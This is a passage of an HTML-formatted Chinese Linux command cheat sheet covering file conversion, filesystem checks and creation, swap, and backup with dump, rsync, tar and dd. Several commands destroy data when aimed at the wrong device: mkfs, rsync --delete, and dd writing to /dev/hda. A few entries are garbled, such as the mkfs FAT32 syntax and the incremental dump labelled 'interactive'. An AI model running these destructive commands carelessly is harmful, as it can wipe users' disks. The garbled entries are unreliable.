sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">unix2dos fileunix.txt filedos.txt 将一个文本文件的格式从UNIX转换成MSDOS</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">recode ..HTML &lt; page.txt &gt; page.html 将一个文本文件转换成html</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">recode -l | more 显示所有允许的转换格式</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>文件系统分析</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">badblocks -v /dev/hda1 检查磁盘hda1上的坏磁块</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">fsck /dev/hda1 修复/检查hda1磁盘上linux文件系统的完整性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">fsck.ext2 /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">e2fsck /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">e2fsck -j /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">fsck.ext3 /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">fsck.vfat /dev/hda1 修复/检查hda1磁盘上fat文件系统的完整性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">fsck.msdos /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dosfsck /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>初始化一个文件系统</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mkfs /dev/hda1 在hda1分区创建一个文件系统</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mke2fs /dev/hda1 在hda1分区创建一个linux ext2的文件系统</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mke2fs -j /dev/hda1 在hda1分区创建一个linux ext3(日志型)的文件系统</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mkfs -t vfat 32 -F /dev/hda1 创建一个 FAT32 文件系统</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">fdformat -n /dev/fd0 格式化一个软盘</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mkswap /dev/hda3 创建一个swap文件系统</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>SWAP文件系统</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mkswap /dev/hda3 创建一个swap文件系统</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">swapon /dev/hda3 启用一个新的swap文件系统</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">swapon /dev/hda2 /dev/hdb3 启用两个swap分区</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>备份</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dump -0aj -f /tmp/home0.bak /home 制作一个 '/home' 目录的完整备份</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dump -1aj -f /tmp/home0.bak /home 制作一个 '/home' 目录的交互式备份</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">restore -if /tmp/home0.bak 还原一个交互式备份</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rsync -rogpav --delete /home /tmp 同步两边的目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rsync -rogpav -e ssh --delete /home ip_address:/tmp 通过SSH通道rsync</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rsync -az -e ssh --delete ip_addr:/home/public /home/local 通过ssh和压缩将一个远程目录同步到本地目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rsync -az -e ssh --delete /home/local ip_addr:/home/public 通过ssh和压缩将本地目录同步到远程目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dd bs=1M if=/dev/hda | gzip | ssh user@ip_addr 'dd of=hda.gz' 通过ssh在远程主机上执行一次备份本地磁盘的操作</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dd if=/dev/sda of=/tmp/file1 备份磁盘内容到一个文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tar -Puf backup.tar /home/user 执行一次对 '/home/user' 目录的交互式备份操作</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">( cd /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr 'cd /home/share/ &amp;&amp; tar x -p' 通过ssh在远程目录中复制一个目录内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">( tar c /home ) | ssh -C user@ip_addr 'cd /home/backup-home &amp;&amp; tar x -p' 通过ssh在远程目录中复制一个本地目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tar cf - . | (cd /tmp/backup ; tar xf - ) 本地将一个目录复制到另一个地方，保留原有权限及链接</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">find /home/user1 -name '*.txt' | xargs cp -av --target-directory=/home/backup/ --parents 从一个目录查找并复制所有以 '.txt' 结尾的文件到另一个目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">find /var/log -name '*.log' | tar cv --files-from=- | bzip2 &gt; log.tar.bz2 查找所有以 '.log' 结尾的文件并做成一个bzip包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dd if=/dev/hda of=/dev/fd0 bs=512 count=1 做一个将 MBR (Master Boot Record)内容复制到软盘的动作</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dd if=/dev/fd0 of=/dev/hda bs=512 count=1 